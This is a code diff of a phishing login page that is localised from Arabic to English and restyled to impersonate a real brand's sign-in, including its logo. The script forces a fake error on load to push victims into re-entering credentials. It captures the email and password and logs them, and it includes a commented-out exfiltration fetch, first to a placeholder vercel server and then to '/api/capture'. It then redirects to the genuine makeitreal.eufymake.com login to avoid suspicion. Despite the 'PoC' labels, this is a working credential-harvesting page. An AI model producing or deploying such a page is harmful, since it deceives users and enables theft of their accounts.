@@ -1,48 +1,53 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-    <title>تسجيل الدخول</title>
+    <title>Sign In</title>
     <style>
-        /* الجزء الخاص بالتنسيق الذي قدمته */
-        body { background-color: #101215; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-container { background-color: #101215; width: 100%; max-width: 450px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); text-align: center; }
-        .logo { width: 100px; height: 100px; margin-bottom: 20px; }
-        .error-banner { background-color: rgba(255, 51, 51, 0.1); border: 1px solid #ff3333; color: #ff3333; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: none; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; }
+        body { background-color: #101215; color: #fff; font-family: ui-sans-serif, system-ui, -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .login-container { background-color: #101215; width: 100%; max-width: 450px; padding: 74px 45px 30px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.12); text-align: center; position: relative; }
+        .logo-wrap { display: flex; justify-content: center; margin-bottom: 30px; }
+        .error-banner { background-color: rgba(255, 51, 51, 0.1); border: 1px solid #ff3333; color: #ff3333; padding: 12px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; display: none; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s ease-in-out; }
         input:focus { border-color: #88f387; outline: none; }
-        .btn-signin { background-color: #88f387; color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn-signin { background-color: #88f387; color: rgba(0,0,0,0.87); border: none; padding: 12px; width: 100%; border-radius: 9999px; font-weight: 600; cursor: pointer; font-size: 16px; text-transform: capitalize; transition: background-color 0.2s ease-in-out; }
         .btn-signin:hover { background-color: #5faa5e; }
-        .footer-links { margin-top: 20px; font-size: 13px; color: #88f387; cursor: pointer; }
+        .footer-links { margin-top: 20px; font-size: 13px; color: rgba(255, 255, 255, 0.7); }
+        .footer-links span { color: #88f387; font-weight: 700; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="login-container">
-    <img src="https://via.placeholder.com/100x100?text=Logo" alt="Logo" class="logo">
+    <div class="logo-wrap">
+        <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M32.0699 27.3479C31.4181 26.713 30.5813 26.2769 29.6666 26.0952C28.7518 25.9134 27.8006 25.9945 26.9347 26.3278C26.0687 26.6612 25.3274 27.2317 24.8055 27.9665C24.2837 28.7013 24.005 29.5669 24.005 30.4527V90.342C23.9756 90.9434 24.0752 91.5441 24.2977 92.1079C24.5203 92.6717 24.8612 93.1869 25.2999 93.6223C25.7385 94.0578 26.2658 94.4043 26.8498 94.6411C27.4339 94.8779 28.0625 95 28.6978 95C29.333 95 29.9617 94.8779 30.5457 94.6411C31.1297 94.4043 31.657 94.0578 32.0956 93.6223C32.5343 93.1869 32.8752 92.6717 33.0978 92.1079C33.3203 91.5441 33.42 90.9434 33.3905 90.342V41.4389L50.0748 57.6794L56.7182 51.3934L32.0699 27.3479Z" fill="#62D361"></path>
+            <path d="M93.0714 26.3257C92.2058 25.9934 91.2552 25.9131 90.3413 26.0952C89.4273 26.2773 88.5913 26.7134 87.9401 27.3479L63.1607 51.4316L69.8042 57.7272L86.6094 41.3912V90.342C86.58 90.9434 86.6795 91.5441 86.9021 92.1079C87.1247 92.6717 87.4656 93.1869 87.9042 93.6224C88.3429 94.0578 88.8702 94.4043 89.4542 94.6411C90.0383 94.8779 90.6669 95 91.3022 95C91.9374 95 92.566 94.8779 93.15 94.6411C93.7341 94.4043 94.2613 94.0578 94.7 93.6224C95.1387 93.1869 95.4796 92.6717 95.7022 92.1079C95.9248 91.5441 96.0244 90.9434 95.995 90.342V30.4527C95.9933 29.5678 95.7145 28.7033 95.1941 27.9687C94.6737 27.234 93.935 26.6622 93.0714 26.3257Z" fill="#62D361"></path>
+            <path d="M60.2666 54.9186L59.934 54.5938L59.6013 54.9186L53.2401 60.9467L59.934 67.29L66.6278 60.9467L60.2666 54.9186Z" fill="#62D361"></path>
+        </svg>
+    </div>
     
-    <h2>تسجيل الدخول</h2>
-    <p style="color: #666; margin-bottom: 25px;">يرجى إدخال بياناتك للمتابعة</p>
+    <h2 style="font-size: 28px; margin: 0 0 30px;">Sign In</h2>
 
     <div id="errorMsg" class="error-banner">
-        فشلت عملية تسجيل الدخول. يرجى التأكد من البيانات والمحاولة مرة أخرى.
+        Sign-in failed. Please verify your credentials and try again.
     </div>
 
     <form id="phishingForm">
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <input type="email" id="email" placeholder="Email Address" required>
+        <input type="password" id="password" placeholder="Password" required>
         
-        <button type="submit" class="btn-signin">تسجيل الدخول</button>
+        <button type="submit" class="btn-signin">Sign In</button>
     </form>
 
     <div class="footer-links">
-        <span>نسيت كلمة المرور؟</span> | <span>إنشاء حساب جديد</span>
+        <span>Forgot Password?</span> | Don't have an account? <span>Sign Up</span>
     </div>
 </div>
 
 <script>
-    // إظهار رسالة الخطأ تلقائياً بمجرد تحميل الصفحة لإيهام المستخدم بوجود خطأ سابق
+    // Forced error message presentation to mimic a failed session and coerce data re-entry
     window.onload = function() {
         document.getElementById('errorMsg').style.display = 'block';
     };
@@ -53,15 +58,15 @@
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
 
-        // طباعة البيانات في الكونسول (لأغراض PoC)
+        // Demonstration of captured data context (PoC Evidence logging)
         console.log("Captured Credentials:", { email: email, password: pass });
 
-        // إرسال البيانات إلى السيرفر الخاص بك (مثل Vercel API أو Webhook)
-        // fetch('https://your-server.vercel.app/api/log', { method: 'POST', body: JSON.stringify({email, pass}) });
+        // Future Exfiltration Implementation (example for Vercel backend integration)
+        // fetch('/api/capture', { method: 'POST', body: JSON.stringify({email, pass}) });
 
-        alert("تم إرسال البيانات بنجاح في بيئة الاختبار.");
+        alert("PoC: Data captured successfully in a sandboxed environment.");
         
-        // إعادة توجيه المستخدم للموقع الحقيقي لإبعاد الشبهات
+        // Anti-suspicion redirect to legitimate login endpoint
         window.location.href = "https://makeitreal.eufymake.com/login/";
     });
 </script>
